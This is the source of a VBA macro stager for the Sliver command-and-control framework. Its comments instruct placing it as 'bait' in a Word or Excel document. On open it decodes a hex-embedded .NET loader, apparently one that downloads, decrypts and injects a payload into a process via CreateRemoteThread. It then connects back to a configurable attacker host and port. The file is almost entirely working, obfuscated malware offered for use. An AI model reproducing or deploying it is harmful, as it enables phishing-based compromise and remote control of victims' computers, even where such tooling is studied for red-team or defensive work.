'   _____                              _________.__  ____                    
'  /     \ _____    ___________  ____ /   _____/|  |/_   |__  __ ___________ 
' /  \ /  \\__  \ _/ ___\_  __ \/  _ \\_____  \ |  | |   \  \/ // __ \_  __ \
'/    Y    \/ __ \\  \___|  | \(  <_> )        \|  |_|   |\   /\  ___/|  | \/
'\____|__  (____  /\___  >__|   \____/_______  /|____/___| \_/  \___  >__|   
        \/     \/     \/                    \/                     \/       
'VBA Sl1ver Stager
'Based on MacroMeter Stager build by Cn33liz

'Usage:
'Change RHOST and RPORT below to suit your needs:

Public Const RHOST As String = "172.16.97.1"
Public Const RPORT As String = "443"

'Then create an awesome Excel or Word Document containing your VBA Bait

'Then throw out your Bait and wait...

Sub Auto_Open()
    MacroMeter
End Sub

Private Function decodeHex(hex)
    On Error Resume Next
    Dim DM, EL
    Set DM = CreateObject("Microsoft.XMLDOM")
    Set EL = DM.createElement("tmp")
    EL.DataType = "bin.hex"
    EL.Text = hex
    decodeHex = EL.NodeTypedValue
End Function

Function MacroMeter()
    Dim serialized_obj
    serialized_obj = "4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "000000000000000000000800000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062"
    serialized_obj = serialized_obj & "652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000504500006486020034da74c80000000000000000f"
    serialized_obj = serialized_obj & "00022200b023000001c00000004000000000000000000000020000000000080010000000020000000020000040000000000"
    serialized_obj = serialized_obj & "000006000000000000000060000000020000000000000300608500004000000000000040000000000000000010000000000"
    serialized_obj = serialized_obj & "000200000000000000000000010000000000000000000000000000000000000000040000098030000000000000000000000"
    serialized_obj = serialized_obj & "000000000000000000000000000000583b00003800000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "00000000000000000000000000000000000000000000000000000000000002000004800000000000000000000002e746578"
    serialized_obj = serialized_obj & "74000000f21b000000200000001c000000020000000000000000000000000000200000602e7273726300000098030000004"
    serialized_obj = serialized_obj & "0000000040000001e0000000000000000000000000000400000400000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "000000000000000000000000000000000048000000020005001424000044170000010000000000000000000000000000000"
    serialized_obj = serialized_obj & "000000000000000000000000000000000000000000000000000000000000000000000000000000013300a00170100000100"
    serialized_obj = serialized_obj & "0011281100000a7e3e000004252d17267e3d000004fe0610000006731200000a25803e000004281300000a741f000001281"
    serialized_obj = serialized_obj & "400000a730d000006026f1500000a0a731600000a0b052c340e042c301f10130b2b100706110b916f1700000a110b175813"
    serialized_obj = serialized_obj & "0b110b068e69175931e7076f1800000a050e0428070000060c2b02060c080428060000060d031304098e691305730b00000"
    serialized_obj = serialized_obj & "613061106167d3600000472010000701104281900000a141414171a7e1a00000a141106120728010000062611077b080000"
    serialized_obj = serialized_obj & "042516731b00000a11057e040000047e0300000428020000061308161309120a098e69281b00000a25110809110a1109280"
    serialized_obj = serialized_obj & "30000062616731b00000a16110816731b00000a1616731b00000a2804000006262a001b300200b900000002000011140a03"
    serialized_obj = serialized_obj & "722b000070281c00000a2c47731d00000a0b02731e00000a0c0816731f00000a0d09076f2000000ade14092c06096f21000"
    serialized_obj = serialized_obj & "00adc082c06086f2100000adc076f2200000a0ade0a072c06076f2100000adc062a03723d000070281c00000a2c54731d00"
    serialized_obj = serialized_obj & "000a130402731e00000a1305110516732300000a1306110611046f2000000ade1811062c0711066f2100000adc11052c071"
    serialized_obj = serialized_obj & "1056f2100000adc11046f2200000a0ade0c11042c0711046f2100000adc062a022a000000014c000002002400092d000a00"
    serialized_obj = serialized_obj & "00000002001c001b37000a0000000002001500354a000a0000000002007c000b87000c00000000020072002193000c00000"
    serialized_obj = serialized_obj & "00002006a003fa9000c000000001b3004008100000003000011030a040b282400000a0c08066f2500000a08076f2600000a"
    serialized_obj = serialized_obj & "08176f2700000a08086f2800000a086f2900000a6f2a00000a0d02731e00000a130411040917732b00000a1305110502160"
    serialized_obj = serialized_obj & "28e696f2c00000a11046f2200000a1306de2211052c0711056f2100000adc11042c0711046f2100000adc082c06086f2100"
    serialized_obj = serialized_obj & "000adc11062a0000000128000002004500175c000c0000000002003a002e68000c0000000002000a006a74000a000000001"
    serialized_obj = serialized_obj & "e02282d00000a2a4a1f408003000004200010000080040000042a7a027e1a00000a7d0600000402282d00000a0202280100"
    serialized_obj = serialized_obj & "002b7d050000042a0000133002006000000000000000027e1a00000a7d2c000004027e1a00000a7d2d000004027e1a00000"
    serialized_obj = serialized_obj & "a7d2e000004027e1a00000a7d39000004027e1a00000a7d3a000004027e1a00000a7d3b000004027e1a00000a7d3c000004"
    serialized_obj = serialized_obj & "02282d00000a0202280200002b7d2b0000042a4e0203282f00000a252080f0fa026f3000000a2a1e02283100000a2a2e730"
    serialized_obj = serialized_obj & "f000006803d0000042a1e02282d00000a2a0a172a0042534a4201000100000000000c00000076342e302e33303331390000"
    serialized_obj = serialized_obj & "000005006c000000f8070000237e000064080000900b000023537472696e677300000000f413000048000000235553003c1"
    serialized_obj = serialized_obj & "400001000000023475549440000004c140000f802000023426c6f620000000000000002000001571d021c090a000000fa01"
    serialized_obj = serialized_obj & "3300160000010000002d000000080000003e000000100000002a000000310000001e0000001000000003000000010000000"
    serialized_obj = serialized_obj & "10000000400000001000000020000000600000002000000000038070100000000000600af05010906001c0601090600c404"
    serialized_obj = serialized_obj & "cb080f00210900000600ec0417080600830517080600640517080600030617080600cf0517080600e805170806000305170"
    serialized_obj = serialized_obj & "80600d804e2080600b604e20806004705170806001e0583060600590a80070600270067030600730769010a004d07ec070a"
    serialized_obj = serialized_obj & "006807ec070600de081e0b0600af071e0b06005b071e0b0600460480070600a00580070600c00780070a00750a6a0a0a009"
    serialized_obj = serialized_obj & "80a6a0a0a00ab06800706009b0401090a00af067a0b0600690440090a00dc0740090a00ef097a0b0a0068086a0a06008c04"
    serialized_obj = serialized_obj & "800706009d0680070600c40880070600790769010a00eb03ec070600fb038007060087071e0b0600ce031e0b0600da031e0"
    serialized_obj = serialized_obj & "b06002307e208000000004a0000000000010001000100100053084d084100010001000a00100095090000410005000a000a"
    serialized_obj = serialized_obj & "01100004080000610008000b0002010000b809000069000c000b000a0010003208000041002b000b0002001000af0a00006"
    serialized_obj = serialized_obj & "d003d000c00032110006303000041003d000e001100070b94011100e00294011100d60097011100800297010600a4069a01"
    serialized_obj = serialized_obj & "06009f086d00060007049d0106000f0a6d000600b7036d00060098039a0106008d039a0106063d03970156805a02a001568"
    serialized_obj = serialized_obj & "06802a00156807c00a00156803002a0015680c300a00156801a02a0015680b801a0015680e401a0015680cc01a001568073"
    serialized_obj = serialized_obj & "01a0015680a802a00156803301a00156801d01a0015680a801a00156801402a0015680f801a00156800903a00156802103a"
    serialized_obj = serialized_obj & "00156804102a0015680c302a00156804b01a00156808d00a00156806200a0015680fc00a0015680a900a0015680f402a001"
    serialized_obj = serialized_obj & "56808c01a0015680ed00a00156809901a00156808b02a001060057039a010600c3036d00060043086d00060016046d00060"
    serialized_obj = serialized_obj & "005039a01060039039a0106004d069a01060055069a010600d3099a010600e1099a01060037059a010600cb099a010600e4"
    serialized_obj = serialized_obj & "0aa40106002e00a40106003a006d000600c40a6d000600ce0a6d00060088086d0036004600a70116000100ab01000000008"
    serialized_obj = serialized_obj & "00096205300af0101000000000080009620f00ac3010b000000000080009620480bcc0110000000000080009120a403d601"
    serialized_obj = serialized_obj & "150048200000000096003a06e1011c006c21000000009600470aec01210080220000000096008d0af401230038230000000"
    serialized_obj = serialized_obj & "0861892080600260040230000000091189808ff012600532300000000861892080600260074230000000086189208060026"
    serialized_obj = serialized_obj & "00e02300000000c400950aee002600f423000000008618920806002700fc230000000091189808ff0127000824000000008"
    serialized_obj = serialized_obj & "61892080600270010240000000083000b0003022700000001001e04000002003004000003008109000004006e0900000500"
    serialized_obj = serialized_obj & "300900000600a809000007007f0a000008005b0b01000900300802000a000208000001000f0a00000200260a00000300690"
    serialized_obj = serialized_obj & "600000400500400000500600a000001000f0a00000200180a00000300610800000400690600000500c507000001000f0a00"
    serialized_obj = serialized_obj & "0002006e09000003005d0600000400300a000005007c0800000600a809000007008203000001004907000002003b0b00000"
    serialized_obj = serialized_obj & "3009a0700000400070b00000500e002000001005203000002009a0700000100d90a00000200070b00000300e00200000100"
    serialized_obj = serialized_obj & "3f0a000001005a0800000200790400000300e60700000400ff09090092080100110092080600190092080a0029009208100"
    serialized_obj = serialized_obj & "031009208100039009208100041009208100049009208100051009208100059009208100061009208150069009208100071"
    serialized_obj = serialized_obj & "0092081000790092081000c90092080600f100920806001901d3063200f9009208370021013e043d001901fb064900d9004"
    serialized_obj = serialized_obj & "5034f000c00920806000c00bf035b000c00ff0a61002901520a670031013e086d0031019208010029016e0b810091009208"
    serialized_obj = serialized_obj & "0600910092088700990092088d003901290897004901610406009100ff0a9e00a10092088d00a9008504b4005101160b870"
    serialized_obj = serialized_obj & "05101ed02870051017706b90051010e0b9e005101e6029e005101b408c000b9009208c90039019504d50081009208060069"
    serialized_obj = serialized_obj & "017006dd00d900950aee00e100a30a0100d9009208060009003400fe0009003800030109003c000801090040000d0109004"
    serialized_obj = serialized_obj & "400120109004800170109004c001c01090050002101090054002601090058002b0109005c00300109006000350109006400"
    serialized_obj = serialized_obj & "3a01090068003f0109006c004401090070004901090074004e0109007800530109007c005801090080005d0109008400620"
    serialized_obj = serialized_obj & "109008800670109008c006c01090090007101090094007601090098007b0109009c0080010900a00085010900a4008a0109"
    serialized_obj = serialized_obj & "00a8008f012e000b0011022e0013001a022e001b0039022e00230042022e002b0054022e00330054022e003b0054022e004"
    serialized_obj = serialized_obj & "30042022e004b005a022e00530054022e005b0054022e00630072022e006b009c022e007300a902a3007b00fe0003018300"
    serialized_obj = serialized_obj & "fe001a007000a3002b075500000103005300010000010500f00a010000010700480b010000010900a403010004800000010"
    serialized_obj = serialized_obj & "00000000000000000000000004d080000040000000000000000000000f5005a0300000000040000000000000000000000f5"
    serialized_obj = serialized_obj & "008007000000000300020004000200050002000600020007000200080002005d00e4005d00e9000000003c3e395f5f31325"
    serialized_obj = serialized_obj & "f30003c446f776e6c6f6164416e64457865637574653e625f5f31325f30004c697374603100636252657365727665643200"
    serialized_obj = serialized_obj & "6c70526573657276656432003c3e39003c4d6f64756c653e0043726561746550726f6365737341004352454154455f42524"
    serialized_obj = serialized_obj & "5414b415741595f46524f4d5f4a4f42004352454154455f53555350454e4445440050524f434553535f4d4f44455f424143"
    serialized_obj = serialized_obj & "4b47524f554e445f454e44004352454154455f44454641554c545f4552524f525f4d4f4445004352454154455f4e45575f4"
    serialized_obj = serialized_obj & "34f4e534f4c4500504147455f455845435554455f5245414457524954450050524f46494c455f4b45524e454c0043524541"
    serialized_obj = serialized_obj & "54455f50524553455256455f434f44455f415554485a5f4c4556454c004352454154455f5348415245445f574f575f56444"
    serialized_obj = serialized_obj & "d004352454154455f53455041524154455f574f575f56444d0050524f434553535f4d4f44455f4241434b47524f554e445f"
    serialized_obj = serialized_obj & "424547494e0053797374656d2e494f004352454154455f4e45575f50524f434553535f47524f55500050524f46494c455f5"
    serialized_obj = serialized_obj & "55345520050524f46494c455f534552564552004352454154455f464f524345444f530049444c455f5052494f524954595f"
    serialized_obj = serialized_obj & "434c415353005245414c54494d455f5052494f524954595f434c41535300484947485f5052494f524954595f434c4153530"
    serialized_obj = serialized_obj & "041424f56455f4e4f524d414c5f5052494f524954595f434c4153530042454c4f575f4e4f524d414c5f5052494f52495459"
    serialized_obj = serialized_obj & "5f434c4153530044455441434845445f50524f43455353004352454154455f50524f5445435445445f50524f43455353004"
    serialized_obj = serialized_obj & "4454255475f50524f434553530044454255475f4f4e4c595f544849535f50524f43455353004d454d5f434f4d4d49540043"
    serialized_obj = serialized_obj & "52454154455f49474e4f52455f53595354454d5f44454641554c54004352454154455f554e49434f44455f454e5649524f4"
    serialized_obj = serialized_obj & "e4d454e5400455854454e4445445f53544152545550494e464f5f50524553454e54004145534956006765745f4956007365"
    serialized_obj = serialized_obj & "745f4956004352454154455f4e4f5f57494e444f570064775800494e48455249545f504152454e545f414646494e4954590"
    serialized_obj = serialized_obj & "0494e48455249545f43414c4c45525f5052494f52495459006477590076616c75655f5f00446f776e6c6f61644461746100"
    serialized_obj = serialized_obj & "64617461006362006d73636f726c6962003c3e630053797374656d2e436f6c6c656374696f6e732e47656e65726963006c7"
    serialized_obj = serialized_obj & "05468726561644964006477546872656164496400647750726f6365737349640043726561746552656d6f74655468726561"
    serialized_obj = serialized_obj & "64006854687265616400416464006c7052657365727665640050616464696e674d6f64650043727970746f53747265616d4"
    serialized_obj = serialized_obj & "d6f646500436f6d7072657373696f6e4d6f64650049446973706f7361626c650062496e686572697448616e646c65006c70"
    serialized_obj = serialized_obj & "5469746c65006c704170706c69636174696f6e4e616d65006c70436f6d6d616e644c696e6500436f6d62696e650056616c7"
    serialized_obj = serialized_obj & "5655479706500666c416c6c6f636174696f6e5479706500446973706f736500583530394365727469666963617465006365"
    serialized_obj = serialized_obj & "727469666963617465004372656174650044656c656761746500577269746500436f6d70696c657247656e6572617465644"
    serialized_obj = serialized_obj & "1747472696275746500477569644174747269627574650044656275676761626c6541747472696275746500436f6d566973"
    serialized_obj = serialized_obj & "69626c6541747472696275746500417373656d626c795469746c6541747472696275746500417373656d626c79547261646"
    serialized_obj = serialized_obj & "56d61726b417474726962757465005461726765744672616d65776f726b41747472696275746500647746696c6c41747472"
    serialized_obj = serialized_obj & "696275746500417373656d626c7946696c6556657273696f6e41747472696275746500417373656d626c79436f6e6669677"
    serialized_obj = serialized_obj & "5726174696f6e41747472696275746500417373656d626c794465736372697074696f6e41747472696275746500466c6167"
    serialized_obj = serialized_obj & "7341747472696275746500436f6d70696c6174696f6e52656c61786174696f6e7341747472696275746500417373656d626"
    serialized_obj = serialized_obj & "c7950726f6475637441747472696275746500417373656d626c79436f707972696768744174747269627574650041737365"
    serialized_obj = serialized_obj & "6d626c79436f6d70616e794174747269627574650052756e74696d65436f6d7061746962696c69747941747472696275746"
    serialized_obj = serialized_obj & "500446f776e6c6f6164416e64457865637574650064775853697a650064775953697a65006477537461636b53697a650064"
    serialized_obj = serialized_obj & "7753697a650053697a654f66007365745f50616464696e670053797374656d2e52756e74696d652e56657273696f6e696e6"
    serialized_obj = serialized_obj & "700537472696e67004c656e677468005572690052656d6f7465436572746966696361746556616c69646174696f6e43616c"
    serialized_obj = serialized_obj & "6c6261636b006765745f536572766572436572746966696361746556616c69646174696f6e43616c6c6261636b007365745"
    serialized_obj = serialized_obj & "f536572766572436572746966696361746556616c69646174696f6e43616c6c6261636b004d61727368616c006b65726e65"
    serialized_obj = serialized_obj & "6c33322e646c6c00536c697665724c6f616465722e646c6c0075726c004465666c61746553747265616d0043727970746f5"
    serialized_obj = serialized_obj & "3747265616d00475a697053747265616d004d656d6f727953747265616d0053797374656d0053796d6d6574726963416c67"
    serialized_obj = serialized_obj & "6f726974686d00436f6d7072657373696f6e416c676f726974686d004943727970746f5472616e73666f726d00456e756d0"
    serialized_obj = serialized_obj & "06c704e756d6265724f6642797465735772697474656e0058353039436861696e00636861696e0053797374656d2e494f2e"
    serialized_obj = serialized_obj & "436f6d7072657373696f6e006c7050726f63657373496e666f726d6174696f6e0053797374656d2e5265666c656374696f6"
    serialized_obj = serialized_obj & "e00436f7079546f006c7053746172747570496e666f005a65726f006c704465736b746f7000536c697665724c6f61646572"
    serialized_obj = serialized_obj & "0073656e646572006275666665720053657276696365506f696e744d616e61676572006c70506172616d657465720068537"
    serialized_obj = serialized_obj & "4644572726f72002e63746f72002e6363746f72006c70536563757269747944657363726970746f72004372656174654465"
    serialized_obj = serialized_obj & "63727970746f7200496e745074720053797374656d2e446961676e6f7374696373004165730053797374656d2e52756e746"
    serialized_obj = serialized_obj & "96d652e496e7465726f7053657276696365730053797374656d2e52756e74696d652e436f6d70696c657253657276696365"
    serialized_obj = serialized_obj & "7300446562756767696e674d6f6465730062496e686572697448616e646c65730053797374656d2e53656375726974792e4"
    serialized_obj = serialized_obj & "3727970746f6772617068792e58353039436572746966696361746573006c7054687265616441747472696275746573006c"
    serialized_obj = serialized_obj & "7050726f6365737341747472696275746573005365637572697479417474726962757465730064774372656174696f6e466"
    serialized_obj = serialized_obj & "c6167730043726561746550726f63657373466c616773006477466c61677300647758436f756e7443686172730064775943"
    serialized_obj = serialized_obj & "6f756e7443686172730053736c506f6c6963794572726f72730073736c506f6c6963794572726f7273006850726f6365737"
    serialized_obj = serialized_obj & "3006c704261736541646472657373006c7041646472657373006c7053746172744164647265737300616464726573730044"
    serialized_obj = serialized_obj & "65636f6d707265737300436f6e636174004f626a65637400666c50726f746563740053797374656d2e4e657400576562436"
    serialized_obj = serialized_obj & "c69656e74006c70456e7669726f6e6d656e7400446563727970740047657457656252657175657374007365745f54696d65"
    serialized_obj = serialized_obj & "6f757400576562436c69656e745769746854696d656f75740068537464496e70757400685374644f7574707574006369706"
    serialized_obj = serialized_obj & "8657274657874007753686f7757696e646f77005669727475616c416c6c6f63457800546f4172726179004145534b657900"
    serialized_obj = serialized_obj & "6765745f4b6579007365745f4b65790053797374656d2e53656375726974792e43727970746f67726170687900546172676"
    serialized_obj = serialized_obj & "57442696e61727900577269746550726f636573734d656d6f7279006c7043757272656e744469726563746f7279006f705f"
    serialized_obj = serialized_obj & "457175616c6974790053797374656d2e4e65742e5365637572697479000000002943003a005c00570069006e0064006f007"
    serialized_obj = serialized_obj & "70073005c00530079007300740065006d00330032005c0000116400650066006c006100740065003900000967007a006900"
    serialized_obj = serialized_obj & "700000001265f703f2659144898966cfbf85be2600042001010803200001052001011111042001010e042001010217070c1"
    serialized_obj = serialized_obj & "d0515124501051d051d050e081218111018081808040000127d052002011c180b000212809112809112809105000101127d"
    serialized_obj = serialized_obj & "0520011d050e0515124501050520010113000520001d13000500020e0e0e0206181007071d0512491249124d12491249125"
    serialized_obj = serialized_obj & "1050002020e0e052001011d050920020112809d1180a10620010112809d0420001d051007071d051d05125512591249125d"
    serialized_obj = serialized_obj & "1d050400001255062001011180ad08200212591d051d050b20030112809d12591180b1072003011d05080806100101081e0"
    serialized_obj = serialized_obj & "0040a01120c040a0112180620011271127508b77a5c561934e0890401000000040200000004040000000408000000041000"
    serialized_obj = serialized_obj & "000004200000000440000000048000000004000100000400020000040004000004000800000400100000040020000004004"
    serialized_obj = serialized_obj & "000000400800000040000010004000002000400000400040000080004000010000400002000040000000104000000020400"
    serialized_obj = serialized_obj & "0000040400000008040000001004000000200400000040040000008002060e0206090206080206020306111402060603061"
    serialized_obj = serialized_obj & "2200306127d13000a180e0e120c120c021114180e12181011100800051818180809090900050218181d0518080a00071818"
    serialized_obj = serialized_obj & "1809181809180a0005010e0e0e1d051d050700021d051d050e0a00031d051d051d051d05030000010d2004021c128081128"
    serialized_obj = serialized_obj & "0851180890801000800000000001e01000100540216577261704e6f6e457863657074696f6e5468726f7773010801000200"
    serialized_obj = serialized_obj & "000000001101000c536c697665724c6f61646572000005010000000017010012436f7079726967687420c2a920203230323"
    serialized_obj = serialized_obj & "400002901002464633431336263362d666135392d343763632d626136392d34343931303135613864303700000c01000731"
    serialized_obj = serialized_obj & "2e302e302e3000004d01001c2e4e45544672616d65776f726b2c56657273696f6e3d76342e372e320100540e144672616d6"
    serialized_obj = serialized_obj & "5776f726b446973706c61794e616d65142e4e4554204672616d65776f726b20342e372e320000000000f6239ab200000000"
    serialized_obj = serialized_obj & "0200000062000000903b0000901d00000000000000000000000000001000000000000000000000000000000052534453586"
    serialized_obj = serialized_obj & "c28f16a55c5468399fdd54621f62e010000005a3a5c436f64655c50656e3330305c536c697665724c6f616465725c536c69"
    serialized_obj = serialized_obj & "7665724c6f616465725c6f626a5c7836345c52656c656173655c536c697665724c6f616465722e706462000000000000000"
    serialized_obj = serialized_obj & "000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100"
    serialized_obj = serialized_obj & "000030000080000000000000000000000000000001000000000048000000584000003c03000000000000000000003c03340"
    serialized_obj = serialized_obj & "00000560053005f00560045005200530049004f004e005f0049004e0046004f0000000000bd04effe000001000000010000"
    serialized_obj = serialized_obj & "00000000000100000000003f000000000000000400000002000000000000000000000000000000440000000100560061007"
    serialized_obj = serialized_obj & "200460069006c00650049006e0066006f00000000002400040000005400720061006e0073006c006100740069006f006e00"
    serialized_obj = serialized_obj & "000000000000b0049c020000010053007400720069006e006700460069006c00650049006e0066006f00000078020000010"
    serialized_obj = serialized_obj & "03000300030003000300034006200300000001a000100010043006f006d006d0065006e0074007300000000000000220001"
    serialized_obj = serialized_obj & "00010043006f006d00700061006e0079004e0061006d006500000000000000000042000d000100460069006c00650044006"
    serialized_obj = serialized_obj & "50073006300720069007000740069006f006e000000000053006c0069007600650072004c006f0061006400650072000000"
    serialized_obj = serialized_obj & "0000300008000100460069006c006500560065007200730069006f006e000000000031002e0030002e0030002e003000000"
    serialized_obj = serialized_obj & "042001100010049006e007400650072006e0061006c004e0061006d006500000053006c0069007600650072004c006f0061"
    serialized_obj = serialized_obj & "006400650072002e0064006c006c00000000004800120001004c006500670061006c0043006f00700079007200690067006"
    serialized_obj = serialized_obj & "8007400000043006f0070007900720069006700680074002000a90020002000320030003200340000002a00010001004c00"
    serialized_obj = serialized_obj & "6500670061006c00540072006100640065006d00610072006b00730000000000000000004a00110001004f0072006900670"
    serialized_obj = serialized_obj & "069006e0061006c00460069006c0065006e0061006d006500000053006c0069007600650072004c006f0061006400650072"
    serialized_obj = serialized_obj & "002e0064006c006c00000000003a000d000100500072006f0064007500630074004e0061006d0065000000000053006c006"
    serialized_obj = serialized_obj & "9007600650072004c006f00610064006500720000000000340008000100500072006f006400750063007400560065007200"
    serialized_obj = serialized_obj & "730069006f006e00000031002e0030002e0030002e003000000038000800010041007300730065006d0062006c007900200"
    serialized_obj = serialized_obj & "0560065007200730069006f006e00000031002e0030002e0030002e00300000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "00000000000000000000000000000000000000000000000000000000000000000000000000000000000"

    entry_class = "MeterPreter"

    Dim stm As Object, fmt As Object, al As Object
    Set stm = CreateObject("System.IO.MemoryStream")
    Set fmt = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
    Set al = CreateObject("System.Collections.ArrayList")

    Dim dec
    dec = decodeHex(serialized_obj)

    For Each i In dec
        stm.WriteByte i
    Next i

    stm.Position = 0

    Dim n As Object, d As Object, o As Object
    Set n = fmt.SurrogateSelector
    Set d = fmt.Deserialize_2(stm)
    al.Add n

    Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)
    o.MSFConnect RHOST, RPORT
End Function
